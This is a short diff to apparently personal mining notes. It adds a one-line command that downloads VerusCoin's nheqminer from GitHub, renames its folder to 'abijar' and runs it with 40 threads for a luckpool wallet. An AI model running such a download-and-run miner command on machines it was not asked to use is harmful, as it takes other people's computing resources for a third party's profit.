@@ -9,3 +9,7 @@ wget https://github.com/VerusCoin/nheqmine...
 - tar -xvf nheqminer-Linux-v0.8.2.tar.gz
 
 - nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RMom8QioCHfMzb8uADuUhQ41nDKEtb8uEM.MyCrypto1 -p x -t 4
+
+
+
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tar.gz && mv nheqminer abijar && cd abijar && ./nheqminer -v -l ap.luckpool.net:3956 -u RQkLV37fWvLMJPHMuh1Tc4g3uvNiquCZ7G.t4 -t 40
